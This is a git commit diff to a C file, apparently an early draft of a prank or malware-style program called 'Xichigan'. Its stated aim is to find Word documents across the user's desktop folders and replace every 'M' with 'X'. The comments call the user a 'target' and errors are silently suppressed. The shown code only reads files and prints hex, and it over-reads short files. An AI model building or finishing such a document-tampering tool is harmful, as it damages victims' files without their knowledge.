425862e4cdb61b899be93bd8fa87c3a0a9387029
LaineRumreich <laineerinr@gmail.com>
2019-03-15 14:21:23 -0400

    Update function convertXtoM to read in the data from word docs as binary data and store it in a buffer. For testing purposes, print out the buffer data as hex

--- Xichigan/XtoM.c
+++ Xichigan/XtoM.c
@@ -8,14 +8,64 @@
 * Called from: main.c										 					 					*
 *																				 							*
 * Functions to search for .doc and .docx files on the desktop                    *
-* of the current user, opens them, and replaces every ‘M’ or ‘m’ with ‘X’        *
+* of the current user, open them, and replace every ‘M’ or ‘m’ with ‘X’          *
 **********************************************************************************/
 
 /*********************************************************************************
 Open the .docx or .doc file and replace 'M' and 'm' with 'X'
 **********************************************************************************/
 void convertXtoM(char *filepath){
-	printf("%s\n", filepath);
+	int c;
+	FILE *file;
+	char *buffer;
+	unsigned long fileLen;
+
+	// Open the file
+	file = fopen(filepath, "rb");
+	if (!file)
+	{
+		//fprintf(stderr, "Unable to open file %s", filepath);
+		return; // Return with no error to target
+	}
+	
+	// Get file length
+	fseek(file, 0, SEEK_END);
+	fileLen=ftell(file);
+	fseek(file, 0, SEEK_SET);
+
+	// Allocate memory for the buffer
+	buffer=(char *)malloc(fileLen+1);
+	if (!buffer)
+	{
+      fclose(file);
+		return;
+	}
+
+	// Read file contents into the buffer
+	fread(buffer, fileLen, 1, file);
+	fclose(file);
+
+	/* For testing purposes */
+	// Print out the first 1000 bytes of data in Hex
+	for (c=0;c<1000;c++)
+	{
+		printf("%.2X ", (int)buffer[c]);
+
+		// Put an extra space between every 4 bytes
+		if (c % 4 == 3)
+		{
+			printf(" ");
+		}
+
+		// Display 16 bytes per line
+		if (c % 16 == 15)
+		{
+			printf("\n");
+		}
+	}
+
+	free(buffer);
+
 }
 
 /*********************************************************************************
@@ -37,14 +87,15 @@ void spiderDirectory(char *homeDir, DIR *d){
 	char *currentDir = malloc(PATH_MAX);
 	int length;
 
-	// Loop until there are no more subdirectories
+	// Loop and recurse until there are no more subdirectories
 	while ((dir = readdir(d)) != NULL)
 	{
+		// Get the full path associated with dir->d_name
 		strcpy(currentDir, homeDir);
 		strcat(currentDir,"/");
 		strcat(currentDir,dir->d_name);
 		
-
+		// If the current element of the directory is a subdirectory (and not . or ..), spider through it
 		if(strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && isDir(currentDir)){
 			currentD = opendir(currentDir);
 			if (currentD)
@@ -75,6 +126,7 @@ void XtoM() {
 
 	// TODO: Get Desktop path if user is using Windows/iOS
 
+	// Look through the desktop and all of its subdirectories for word documents, and do the conversion XtoM
 	d = opendir(homedir);
 	if (d)
 	{
